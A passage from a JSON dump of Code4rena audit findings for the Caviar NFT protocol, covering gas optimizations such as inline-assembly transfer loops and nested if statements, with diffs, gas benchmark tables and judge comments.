a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -158,8 +158,30 @@ contract EthRouter is ERC721TokenReceiver {\n         // loop through and execute the sells\n         for (uint256 i = 0; i < sells.length; i++) {\n             // transfer the NFTs into the router from the caller\n-            for (uint256 j = 0; j < sells[i].tokenIds.length; j++) {\n-                ERC721(sells[i].nft).safeTransferFrom(msg.sender, address(this), sells[i].tokenIds[j]);\n+            {\n+                Sell calldata _sell = sells[i];\n+                uint256[] calldata _tokenIds = _sell.tokenIds;\n+                assembly {\n+                    if _tokenIds.length {\n+                        let memptr := mload(0x40)\n+                        let end := add(_tokenIds.offset, mul(0x20, _tokenIds.length))\n+                        let j := _tokenIds.offset\n+                        mstore(0x00, 0x42842e0e)\n+                        mstore(0x20, caller())\n+                        mstore(0x40, address())\n+                        for {} 1 {} {\n+                            mstore(0x60, calldataload(j))\n+                            let success := call(gas(), calldataload(add(_sell, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                            if iszero(success) {\n+                                revert(0, 0)\n+                            }\n+                            j := add(j, 0x20)\n+                            if iszero(lt(j, end)) { break }\n+                        }\n+                        mstore(0x40, memptr)\n+                        mstore(0x60, 0x00)\n+                    }\n+                }\n             }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L239-L241\n\n*Gas Savings for `EthRouter.deposit`, obtained via protocol's tests: Avg 211 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  2371    |  114072  |  29900  |    4     |\n| After  |  2371    |  113228  |  29689  |    4     |\n\n```solidity\nFile: src/EthRouter.sol\n239:        for (uint256 i = 0; i < tokenIds.length; i++) {\n240:            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n241:        }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..3006dcb 100644\n--- a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -236,8 +236,26 @@ contract EthRouter is ERC721TokenReceiver {\n         }\n\n         // transfer NFTs from caller\n-        for (uint256 i = 0; i < tokenIds.length; i++) {\n-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n+        assembly {\n+            if tokenIds.length {\n+                let memptr := mload(0x40)\n+                let end := add(tokenIds.offset, mul(0x20, tokenIds.length))\n+                let i := tokenIds.offset\n+                mstore(0x00, 0x42842e0e)\n+                mstore(0x20, caller())\n+                mstore(0x40, address())\n+                for {} 1 {} {\n+                    mstore(0x60, calldataload(i))\n+                    let success := call(gas(), calldataload(0x24), 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                    if iszero(success) {\n+                        revert(0, 0)\n+                    }\n+                    i := add(i, 0x20)\n+                    if iszero(lt(i, end)) { break }\n+                }\n+                mstore(0x40, memptr)\n+                mstore(0x60, 0x00)\n+            }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L265-L286\n\n*Gas Savings for `EthRouter.change`, obtained via protocol's tests: Avg 6587 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  284857  |  298879  |  217295 |    4     |\n| After  |  276074  |  290096  |  210708 |    4     |\n\n```solidity\nFile: src/EthRouter.sol\n265:            for (uint256 j = 0; j < changes[i].inputTokenIds.length; j++) {\n266:                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _change.inputTokenIds[j]);\n267:            }\n...            \n284:            for (uint256 j = 0; j < changes[i].outputTokenIds.length; j++) {\n285:                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _change.outputTokenIds[j]);\n286:            }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..250b83b 100644\n--- a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -260,10 +260,30 @@ contract EthRouter is ERC721TokenReceiver {\n         // loop through and execute the changes\n         for (uint256 i = 0; i < changes.length; i++) {\n             Change memory _change = changes[i];\n+            uint256[] memory _inputTokenIds = _change.inputTokenIds;\n+            uint256[] memory _outputTokenIds = _change.outputTokenIds;\n\n             // transfer NFTs from caller\n-            for (uint256 j = 0; j < changes[i].inputTokenIds.length; j++) {\n-                ERC721(_change.nft).safeTransferFrom(msg.sender, address(this), _change.inputTokenIds[j]);\n+            assembly {\n+                if mload(_inputTokenIds) {\n+                    let memptr := mload(0x40)\n+                    let end := add(add(_inputTokenIds, 0x20), mul(0x20, mload(_inputTokenIds)))\n+                    let j := add(_inputTokenIds, 0x20)\n+                    mstore(0x00, 0x42842e0e)\n+                    mstore(0x20, caller())\n+                    mstore(0x40, address())\n+                    for {} 1 {} {\n+                        mstore(0x60, mload(j))\n+                        let success := call(gas(), mload(add(_change, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                        if iszero(success) {\n+                            revert(0, 0)\n+                        }\n+                        j := add(j, 0x20)\n+                        if iszero(lt(j, end)) { break }\n+                    }\n+                    mstore(0x40, memptr)\n+                    mstore(0x60, 0x00)\n+                }\n             }\n\n             // approve pair to transfer NFTs from router\n@@ -281,8 +301,26 @@ contract EthRouter is ERC721TokenReceiver {\n             );\n\n             // transfer NFTs to caller\n-            for (uint256 j = 0; j < changes[i].outputTokenIds.length; j++) {\n-                ERC721(_change.nft).safeTransferFrom(address(this), msg.sender, _change.outputTokenIds[j]);\n+            assembly {\n+                if mload(_outputTokenIds) {\n+                    let memptr := mload(0x40)\n+                    let end := add(add(_outputTokenIds, 0x20), mul(0x20, mload(_outputTokenIds)))\n+                    let j := add(_outputTokenIds, 0x20)\n+                    mstore(0x00, 0x42842e0e)\n+                    mstore(0x20, address())\n+                    mstore(0x40, caller())\n+                    for {} 1 {} {\n+                        mstore(0x60, mload(j))\n+                        let success := call(gas(), mload(add(_change, 0x20)), 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                        if iszero(success) {\n+                            revert(0, 0)\n+                        }\n+                        j := add(j, 0x20)\n+                        if iszero(lt(j, end)) { break }\n+                    }\n+                    mstore(0x40, memptr)\n+                    mstore(0x60, 0x00)\n+                }\n             }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L441-L448\n\n*Gas Savings for `PrivatePool.change`, obtained via protocol's tests: Avg 2388 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  116432  |  142008  |  82138  |    17    |\n| After  |  113218  |  136466  |  79750  |    17    |\n\n```solidity\nFile: src/PrivatePool.sol\n441:        for (uint256 i = 0; i < inputTokenIds.length; i++) {\n442:            ERC721(nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]);\n443:        }\n444:\n445:        // transfer the output nfts to the caller\n446:        for (uint256 i = 0; i < outputTokenIds.length; i++) {\n447:            ERC721(nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]);\n448:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..859111e 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -438,13 +438,51 @@ contract PrivatePool is ERC721TokenReceiver {\n         }\n\n         // transfer the input nfts from the caller\n-        for (uint256 i = 0; i < inputTokenIds.length; i++) {\n-            ERC721(nft).safeTransferFrom(msg.sender, address(this), inputTokenIds[i]);\n+        address _nft = nft;\n+        assembly {\n+            if mload(inputTokenIds) {\n+                let memptr := mload(0x40)\n+                let end := add(add(inputTokenIds, 0x20), mul(0x20, mload(inputTokenIds)))\n+                let i := add(inputTokenIds, 0x20)\n+                mstore(0x00, 0x42842e0e)\n+                mstore(0x20, caller())\n+                mstore(0x40, address())\n+                for {} 1 {} {\n+                    mstore(0x60, mload(i))\n+                    let success := call(gas(), _nft, 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                    if iszero(success) {\n+                        revert(0, 0)\n+                    }\n+                    i := add(i, 0x20)\n+                    if iszero(lt(i, end)) { break }\n+                }\n+                mstore(0x40, memptr)\n+                mstore(0x60, 0x00)\n+            }\n+\n         }\n\n         // transfer the output nfts to the caller\n-        for (uint256 i = 0; i < outputTokenIds.length; i++) {\n-            ERC721(nft).safeTransferFrom(address(this), msg.sender, outputTokenIds[i]);\n+        assembly {\n+            if mload(outputTokenIds) {\n+                let memptr := mload(0x40)\n+                let end := add(add(outputTokenIds, 0x20), mul(0x20, mload(outputTokenIds)))\n+                let i := add(outputTokenIds, 0x20)\n+                mstore(0x00, 0x42842e0e)\n+                mstore(0x20, address())\n+                mstore(0x40, caller())\n+                for {} 1 {} {\n+                    mstore(0x60, mload(i))\n+                    let success := call(gas(), _nft, 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                    if iszero(success) {\n+                        revert(0, 0)\n+                    }\n+                    i := add(i, 0x20)\n+                    if iszero(lt(i, end)) { break }\n+                }\n+                mstore(0x40, memptr)\n+                mstore(0x60, 0x00)\n+            }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L496-L498\n\n**Note: `PrivatePool.deposit` is fuzzed, which results in inconsistent gas usage during tests. This is why `EthRouter.deposit` is benchmarked instead**.\n\n*Gas Savings for `EthRouter.deposit`, obtained via protocol's tests: Avg 232 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  2371    |  114072  |  29900  |    4     |\n| After  |  2371    |  113145  |  29668  |    4     |\n\n```solidity\nFile: src/PrivatePool.sol\n496:        for (uint256 i = 0; i < tokenIds.length; i++) {\n497:            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n498:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..b22c813 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -493,8 +493,27 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Interactions ~~~ //\n\n         // transfer the nfts from the caller\n-        for (uint256 i = 0; i < tokenIds.length; i++) {\n-            ERC721(nft).safeTransferFrom(msg.sender, address(this), tokenIds[i]);\n+        address _nft = nft;\n+        assembly {\n+            if tokenIds.length {\n+                let memptr := mload(0x40)\n+                let end := add(tokenIds.offset, mul(0x20, tokenIds.length))\n+                let i := tokenIds.offset\n+                mstore(0x00, 0x42842e0e)\n+                mstore(0x20, caller())\n+                mstore(0x40, address())\n+                for {} 1 {} {\n+                    mstore(0x60, calldataload(i))\n+                    let success := call(gas(), _nft, 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                    if iszero(success) {\n+                        revert(0, 0)\n+                    }\n+                    i := add(i, 0x20)\n+                    if iszero(lt(i, end)) { break }\n+                }\n+                mstore(0x40, memptr)\n+                mstore(0x60, 0x00)\n+            }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L518-L520\n\n*Gas Savings for `PrivatePool.withdraw`, obtained via protocol's tests: Avg 985 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  81842   |  81842   |  62023  |    5     |\n| After  |  80547   |  80547   |  61038  |    5     |\n\n```solidity\nFile: src/PrivatePool.sol\n518:        for (uint256 i = 0; i < tokenIds.length; i++) {\n519:            ERC721(_nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n520:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..4211c9e 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -515,8 +515,26 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Interactions ~~~ //\n\n         // transfer the nfts to the caller\n-        for (uint256 i = 0; i < tokenIds.length; i++) {\n-            ERC721(_nft).safeTransferFrom(address(this), msg.sender, tokenIds[i]);\n+        assembly {\n+            if tokenIds.length {\n+                let memptr := mload(0x40)\n+                let end := add(tokenIds.offset, mul(0x20, tokenIds.length))\n+                let i := tokenIds.offset\n+                mstore(0x00, 0x42842e0e)\n+                mstore(0x20, address())\n+                mstore(0x40, caller())\n+                for {} 1 {} {\n+                    mstore(0x60, calldataload(i))\n+                    let success := call(gas(), calldataload(0x04), 0x00, 0x1c, 0x64, 0x00, 0x00)\n+                    if iszero(success) {\n+                        revert(0, 0)\n+                    }\n+                    i := add(i, 0x20)\n+                    if iszero(lt(i, end)) { break }\n+                }\n+                mstore(0x40, memptr)\n+                mstore(0x60, 0x00)\n+            }\n         }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L673-L679\n\n**Note: `PrivatePool.sumWeightsAndValidateProof` is called by all the functions below**.\n\n*Gas Savings for `PrivatePool.buy`, obtained via protocol's tests: Avg 33 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  74037   |  158864  |  70884  |    24    |\n| After  |  74037   |  158864  |  70851  |    24    |\n\n*Gas Savings for `PrivatePool.sell`, obtained via protocol's tests: Avg 74 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  50139   |  170448  |  81969  |    25    |\n| After  |  50139   |  170448  |  81895  |    25    |\n\n*Gas Savings for `PrivatePool.change`, obtained via protocol's tests: Avg 157 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  116432  |  142008  |  82138  |    17    |\n| After  |  116432  |  142008  |  81981  |    17    |\n\n```solidity\nFile: src/PrivatePool.sol\n673:        for (uint256 i = 0; i < tokenIds.length; i++) {\n674:            // create the leaf for the merkle proof\n675:            leafs[i] = keccak256(bytes.concat(keccak256(abi.encode(tokenIds[i], tokenWeights[i]))));\n676:\n677:            // sum each token weight\n678:            sum += tokenWeights[i];\n679:        }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..7d63e8e 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -670,12 +670,25 @@ contract PrivatePool is ERC721TokenReceiver {\n\n         uint256 sum;\n         bytes32[] memory leafs = new bytes32[](tokenIds.length);\n-        for (uint256 i = 0; i < tokenIds.length; i++) {\n-            // create the leaf for the merkle proof\n-            leafs[i] = keccak256(bytes.concat(keccak256(abi.encode(tokenIds[i], tokenWeights[i]))));\n-\n-            // sum each token weight\n-            sum += tokenWeights[i];\n+        assembly {\n+            if mload(tokenIds) {\n+                let end := add(add(tokenIds, 0x20), mul(0x20, mload(tokenIds)))\n+                let i := add(tokenIds, 0x20)\n+                let j := add(tokenWeights, 0x20)\n+                let k := add(leafs, 0x20)\n+                for {} 1 {} {\n+                    mstore(0x00, mload(i))\n+                    mstore(0x20, mload(j))\n+                    mstore(0x00, keccak256(0x00, 0x40))\n+                    let hash := keccak256(0x00, 0x20)\n+                    mstore(k, hash)\n+                    sum := add(sum, mload(j))\n+                    i := add(i, 0x20)\n+                    j := add(j, 0x20)\n+                    k := add(k, 0x20)\n+                    if iszero(lt(i, end)) { break }\n+                }\n+            }\n         }\n```\n## `GasReport` output, with all optimizations applied\n```js\n| src/EthRouter.sol:EthRouter contract |                 |        |        |        |         |\n|--------------------------------------|-----------------|--------|--------|--------|---------|\n| Deployment Cost                      | Deployment Size |        |        |        |         |\n| 1415709                              | 7247            |        |        |        |         |\n| Function Name                        | min             | avg    | median | max    | # calls |\n| buy                                  | 658             | 190464 | 179510 | 374824 | 7       |\n| change                               | 576             | 202568 | 265225 | 279247 | 4       |\n| deposit                              | 773             | 29393  | 2361   | 112078 | 4       |\n| onERC721Received                     | 698             | 698    | 698    | 698    | 92      |\n| receive                              | 55              | 55     | 55     | 55     | 16      |\n| sell                                 | 732             | 223981 | 209434 | 388776 | 7       |\n\n\n| src/Factory.sol:Factory contract |                 |        |        |        |         |\n|----------------------------------|-----------------|--------|--------|--------|---------|\n| Deployment Cost                  | Deployment Size |        |        |        |         |\n| 1403424                          | 7270            |        |        |        |         |\n| Function Name                    | min             | avg    | median | max    | # calls |\n| create                           | 1641            | 148672 | 161112 | 243941 | 35      |\n| ownerOf                          | 0               | 20     | 0      | 622    | 30      |\n| predictPoolDeploymentAddress     | 2868            | 2868   | 2868   | 2868   | 1       |\n| privatePoolImplementation        | 403             | 403    | 403    | 403    | 1       |\n| privatePoolMetadata              | 426             | 426    | 426    | 426    | 1       |\n| protocolFeeRate                  | 419             | 1332   | 419    | 2419   | 127     |\n| receive                          | 55              | 55     | 55     | 55     | 3       |\n| setPrivatePoolImplementation     | 22744           | 22744  | 22744  | 22744  | 133     |\n| setPrivatePoolMetadata           | 2599            | 22357  | 22634  | 22634  | 127     |\n| setProtocolFeeRate               | 7521            | 9678   | 7521   | 22621  | 7       |\n| tokenURI                         | 367468          | 367468 | 367468 | 367468 | 1       |\n| withdraw                         | 2729            | 12149  | 11128  | 23611  | 4       |\n\n\n| src/PrivatePool.sol:PrivatePool contract |                 |       |        |        |         |\n|------------------------------------------|-----------------|-------|--------|--------|---------|\n| Deployment Cost                          | Deployment Size |       |        |        |         |\n| 3097024                                  | 15926           |       |        |        |         |\n| Function Name                            | min             | avg   | median | max    | # calls |\n| baseToken                                | 404             | 904   | 404    | 2404   | 12      |\n| buy                                      | 1123            | 69821 | 73315  | 157662 | 24      |\n| buyQuote                                 | 2282            | 5817  | 4282   | 10782  | 28      |\n| change                                   | 4723            | 78083 | 111589 | 134100 | 17      |\n| changeFee                                | 366             | 366   | 366    | 366    | 2       |\n| changeFeeQuote                           | 3070            | 9202  | 10796  | 10796  | 18      |\n| deposit                                  | 793             | 62671 | 13721  | 357344 | 8       |\n| execute                                  | 3615            | 18550 | 17976  | 35939  | 6       |\n| factory                                  | 261             | 261   | 261    | 261    | 2       |\n| feeRate                                  | 375             | 375   | 375    | 375    | 5       |\n| flashFee                                 | 539             | 1872  | 2539   | 2539   | 3       |\n| flashFeeToken                            | 419             | 819   | 419    | 2419   | 5       |\n| flashLoan                                | 62820           | 82915 | 82915  | 103011 | 2       |\n| initialize                               | 1205            | 62085 | 55637  | 95437  | 147     |\n| initialized                              | 418             | 418   | 418    | 418    | 1       |\n| merkleRoot                               | 385             | 385   | 385    | 385    | 3       |\n| nft                                      | 383             | 383   | 383    | 383    | 6       |\n| onERC721Received                         | 840             | 840   | 840    | 840    | 151     |\n| payRoyalties                             | 393             | 393   | 393    | 393    | 3       |\n| price                                    | 1185            | 3866  | 5185   | 5185   | 7       |\n| receive                                  | 55              | 55    | 55     | 55     | 33      |\n| sell                                     | 6077            | 81284 | 49660  | 169661 | 25      |\n| sellQuote                                | 2407            | 5657  | 4407   | 10907  | 22      |\n| setFeeRate                               | 3384            | 6451  | 6459   | 9503   | 4       |\n| setMerkleRoot                            | 9425            | 9425  | 9425   | 9425   | 2       |\n| setPayRoyalties                          | 3406            | 6164  | 6704   | 9504   | 5       |\n| setUseStolenNftOracle                    | 3428            | 5628  | 6729   | 6729   | 3       |\n| setVirtualReserves                       | 3568            | 7639  | 8530   | 9930   | 4       |\n| useStolenNftOracle                       | 417             | 417   | 417    | 417    | 3       |\n| virtualBaseTokenReserves                 | 470             | 470   | 470    | 470    | 8       |\n| virtualNftReserves                       | 465             | 465   | 465    | 465    | 8       |\n| withdraw                                 | 3774            | 61038 | 80547  | 80547  | 5       |\n```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/372#issuecomment-1523266431):**\n > At least 2k gas from SLOADs and the Calldata.\n> \n> Will check the rest.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-04-caviar-findings/issues/372#issuecomment-1527531813):**\n > **[G-01] Cache calldata/memory pointers for complex types to avoid offset calculations**   52<br>\n> Refactor\n> \n> **[G-02] Use calldata instead of memory for function arguments that do not get mutated**   4<br>\n> Low\n> \n> **[G-03] State variables can be cached instead of re-reading them from storage**   16<br>\n> Low\n> \n> **[G-04] Cache state variables outside of loop to avoid reading storage on every iteration**   6<br>\n> Non-Critical\n> \n> **[G-05] Rearrange code to fail early**   1<br>\n> Ignoring\n> \n> **[G-06] x += y/x -= y costs more gas than x = x + y/x = x - y for state variables**   2<br>\n> Non-Critical\n> \n> **[G-07] If statements that use && can be refactored into nested if statements**   9<br>\n> Ignoring\n> \n> **[G-08] Use assembly for loops**<br>\n> Refactor\n> \n> Bonus of 5 points because fully benchmarked.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-08-use-assembly-for-loops",
      "tags": [],
      "finders": []
    },
    {
      "id": "16269",
      "title": "[G-07] `If` statements that use `&&` can be refactored into nested `if` statements",
      "impact": "GAS",
      "content": "\nTotal Instances: `9`\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L225\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L277\n\n*Gas Savings for `PrivatePool.buy`, obtained via protocol's tests: Avg 25 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  74037   |  158864  |  70884  |    24    |\n| After  |  74011   |  158793  |  70859  |    24    |\n\n```solidity\nFile: src/PrivatePool.sol\n225:        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n\n277:        if (royaltyFee > 0 && recipient != address(0)) {\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..73492e8 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -222,7 +222,11 @@ contract PrivatePool is ERC721TokenReceiver {\n         (netInputAmount, feeAmount, protocolFeeAmount) = buyQuote(weightSum);\n\n         // check that the caller sent 0 ETH if the base token is not ETH\n-        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n+        if (baseToken != address(0)) {\n+            if (msg.value > 0) {\n+                revert InvalidEthAmount();\n+            }\n+        }\n\n         // ~~~ Effects ~~~ //\n\n@@ -274,11 +278,13 @@ contract PrivatePool is ERC721TokenReceiver {\n                 (uint256 royaltyFee, address recipient) = _getRoyalty(tokenIds[i], salePrice);\n\n                 // transfer the royalty fee to the recipient if it's greater than 0\n-                if (royaltyFee > 0 && recipient != address(0)) {\n-                    if (baseToken != address(0)) {\n-                        ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n-                    } else {\n-                        recipient.safeTransferETH(royaltyFee);\n+                if (royaltyFee > 0) {\n+                    if (recipient != address(0)) {\n+                        if (baseToken != address(0)) {\n+                            ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n+                        } else {\n+                            recipient.safeTransferETH(royaltyFee);\n+                        }\n                     }\n                 }\n             }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L344-L350\n\n*Gas Savings for `PrivatePool.sell`, obtained via protocol's tests: Avg 29 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  50139   |  170448  |  81969  |    25    |\n| After  |  50139   |  170394  |  81940  |    25    |\n\n```solidity\nFile: src/PrivatePool.sol\n344:                if (royaltyFee > 0 && recipient != address(0)) {\n345:                    if (baseToken != address(0)) {\n346:                        ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n347:                    } else {\n348:                        recipient.safeTransferETH(royaltyFee);\n349:                    }\n350:                }\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..a3218eb 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -341,11 +341,13 @@ contract PrivatePool is ERC721TokenReceiver {\n                 royaltyFeeAmount += royaltyFee;\n\n                 // transfer the royalty fee to the recipient if it's greater than 0\n-                if (royaltyFee > 0 && recipient != address(0)) {\n-                    if (baseToken != address(0)) {\n-                        ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n-                    } else {\n-                        recipient.safeTransferETH(royaltyFee);\n+                if (royaltyFee > 0) {\n+                    if (recipient != address(0)) {\n+                        if (baseToken != address(0)) {\n+                            ERC20(baseToken).safeTransfer(recipient, royaltyFee);\n+                        } else {\n+                            recipient.safeTransferETH(royaltyFee);\n+                        }\n                     }\n                 }\n             }\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L397\n\n*Gas Savings for `PrivatePool.change`, obtained via protocol's tests: Avg 25 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  116432  |  142008  |  82138  |    17    |\n| After  |  116406  |  141982  |  82113  |    17    |\n\n```solidity\nFile: src/PrivatePool.sol\n397:        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..e9bd8f2 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -394,7 +394,11 @@ contract PrivatePool is ERC721TokenReceiver {\n         // ~~~ Checks ~~~ //\n\n         // check that the caller sent 0 ETH if base token is not ETH\n-        if (baseToken != address(0) && msg.value > 0) revert InvalidEthAmount();\n+        if (baseToken != address(0)) {\n+            if (msg.value > 0) {\n+                revert InvalidEthAmount();\n+            }\n+        }\n\n         // check that NFTs are not stolen\n         if (useStolenNftOracle) {\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L635\n\n*Gas Savings for `PrivatePool.flashLoan`, obtained via protocol's tests: Avg 16 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  83063   |  103206  |  83063  |    2     |\n| After  |  83047   |  103185  |  83047  |    2     |\n\n```solidity\nFile: src/PrivatePool.sol\n635:        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n```\n```diff\ndiff --git a/src/PrivatePool.sol b/src/PrivatePool.sol\nindex 75991e1..fe5c440 100644\n--- a/src/PrivatePool.sol\n+++ b/src/PrivatePool.sol\n@@ -632,7 +632,11 @@ contract PrivatePool is ERC721TokenReceiver {\n         uint256 fee = flashFee(token, tokenId);\n\n         // if base token is ETH then check that caller sent enough for the fee\n-        if (baseToken == address(0) && msg.value < fee) revert InvalidEthAmount();\n+        if (baseToken == address(0)) {\n+            if (msg.value < fee) {\n+                revert InvalidEthAmount();\n+            }\n+        }\n\n         // transfer the NFT to the borrower\n         ERC721(token).safeTransferFrom(address(this), address(receiver), tokenId);\n```\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L101-L103\n\n*Gas Savings for `EthRouter.buy`, obtained via protocol's tests: Avg 10 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  187054  |  397581  |  199750 |    7     |\n| After  |  187044  |  397569  |  199740 |    7     |\n\n```solidity\nFile: src/EthRouter.sol\n101:        if (block.timestamp > deadline && deadline != 0) {\n102:            revert DeadlinePassed();\n103:        }\n```\n```diff\ndiff --git a/src/EthRouter.sol b/src/EthRouter.sol\nindex 125001d..41ef7bf 100644\n--- a/src/EthRouter.sol\n+++ b/src/EthRouter.sol\n@@ -98,8 +98,10 @@ contract EthRouter is ERC721TokenReceiver {\n     /// @param payRoyalties Whether to pay royalties or not.\n     function buy(Buy[] calldata buys, uint256 deadline, bool payRoyalties) public payable {\n         // check that the deadline has not passed (if any)\n-        if (block.timestamp > deadline && deadline != 0) {\n-            revert DeadlinePassed();\n+        if (block.timestamp > deadline) {\n+            if (deadline != 0) {\n+                revert DeadlinePassed();\n+            }\n         }\n```\n\nThe instances below are similar to the one above:\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L154-L156\n\n*Gas Savings for `EthRouter.sell`, obtained via protocol's tests: Avg 11 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  217300  |  402940  |  232102 |    7     |\n| After  |  217290  |  402928  |  232091 |    7     |\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L228-L230\n\n*Gas Savings for `EthRouter.deposit`, obtained via protocol's tests: Avg 12 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  2371    |  114072  |  29900  |    4     |\n| After  |  2359    |  114060  |  29888  |    4     |\n\nhttps://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L256-L258\n\n*Gas Savings for `EthRouter.change`, obtained via protocol's tests: Avg 12 gas*\n\n|        |    Med   |    Max   |   Avg   | # calls  |\n| ------ | -------- | -------- | ------- | -------- |\n| Before |  284857  |  298879  |  217295 |    4     |\n| After  |  284845  |  298867  |  217283 |    4     |\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Caviar",
      "source_link": "https://code4rena.com/reports/2023-04-caviar",
      "github_link": "#g-07-if-statements-that-use--can-be-refactored-into-nested-if-statements",
      "tags": [],
      "finders": []
    },
    {
      "id": "16268",
      "title": "[G-06] `x += y/x -= y` costs more gas than `x = x + y/x = x - y` for state variables",
      "impact": "GAS",
